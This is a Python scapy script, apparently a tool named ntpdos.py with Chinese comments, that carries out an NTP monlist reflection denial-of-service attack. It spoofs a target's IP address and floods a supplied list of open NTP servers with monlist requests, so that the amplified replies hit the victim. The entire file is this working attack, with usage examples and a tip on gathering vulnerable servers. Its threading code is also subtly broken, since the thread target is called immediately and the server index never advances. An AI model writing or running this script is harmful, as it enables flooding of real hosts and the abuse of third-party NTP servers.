#python3
#by Br0w5e
from scapy.all import *
import sys
import threading
import time
import random

#一些帮助信息
def Usage():
	print("Usage python3 ./ntpdos.py <target ip> <ntpserver list(文件，一行一个ip)> <threads_number(比服务器少！)>")
	print("eg: python36 ntpdos.py 192.168.1.128 monlistServers.txt 20")
	exit(0)

#攻击
def deny_attack(ntplist, currentserver, data, target):
	#导入全局变量
	ntpserver = ntplist[currentserver] #新的ntp服务器
	currentserver = currentserver + 1  #下一个服务器
	packet = IP(dst = ntpserver, src = target) / UDP(sport = random.randint(1000,65535), dport=123) / Raw(load = data) #包构造，并发送
	send(packet, loop = 1) #发送

def main():
	try:
		if len(sys.argv) != 4:
			Usage()
		#argv[0] = ntpdos.py
		#argv[1] = target ip
		#argv[2] = ntpserverfile
		#argv[3] = thred
		target = sys.argv[1]
		ntpserverfile = sys.argv[2]
		numberthreads = int(sys.argv[3])
		ntplist = []
		currentserver = 0

		#请求数据包，前边的都是报格式，不会就去查查NTP包的格式吧！
		data = "\x17\x00\x03\x2a" + "\x00" * 4

		#ntp端口打开的服务器！ 端口：123，这个文件自己写脚本扫描或者在网上查一下。
		with open(ntpserverfile) as f:
			ntplist = f.readlines()

		#确保线程数量小于服务器数量
		if  numberthreads > int(len(ntplist)):
			print("Arg Error! threads number should less than ntpserver. Please try again!")
			exit(0)
		
		#生成并执行
		threads = []
		print("Start Attack: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads")
		print("Use CTRL+C to stop attack!")
		for i in range(numberthreads):
			thread = threading.Thread(target = deny_attack(ntplist, currentserver, data, target))
			thread.daemon = True
			thread.start()
			threads.append(thread)

		#一直执行直到手动杀死进程
		while True:
			time.sleep(1)
	except KeyboardInterrupt:
		print("Ctrl + C to Stop!")

if __name__ == "__main__":
    	main()
